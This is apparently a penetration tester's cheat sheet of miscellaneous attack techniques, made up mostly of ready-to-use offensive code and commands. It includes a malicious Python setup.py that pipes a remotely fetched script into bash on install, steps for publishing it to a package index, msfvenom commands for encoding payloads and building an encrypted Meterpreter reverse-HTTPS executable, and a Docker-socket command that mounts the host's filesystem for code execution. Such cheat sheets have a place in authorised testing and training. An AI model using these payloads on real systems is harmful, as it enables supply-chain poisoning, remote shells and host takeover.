# Misc

### PyPi Package Upload

Minimal Python Package:

```python
from distutils.core import setup
import os

if not "xct" in open("/etc/passwd").read():
    os.system("curl <ip>/x.sh|/bin/bash")
setup(name='xct',
      version='1.0',
      py_modules=[],
      )
```

Then you can do `python setup.py sdist upload -r local` do upload it to a remote server pypi server. This needs a configuration file in home:

```text
[distutils]
index-servers =
  local

[local]
repository: http://<>
username: <>
password: <>
```

### Encode existing payload with msfvenom

```bash
msfvenom -f raw -i 33 -a x86_64 --platform windows -e x86/shikata_ga_nai -p generic/custom PAYLOADFILE=<file> -o <enc_file>
```

Note that shikata-ga-nai does not work for x64 payloads, in this case we can use x64/zutto\_dekiru.

### Create encrypted payload with msfvenom

```text
msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT=443 --encrypt aes256 --encrypt-key mykey -f exe -o aes.exe
```

### Exposed Docker Socket RCE

```text
docker -H <ip>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

For file access cat /mnt/etc/passwd, for RCE chroot /mnt.

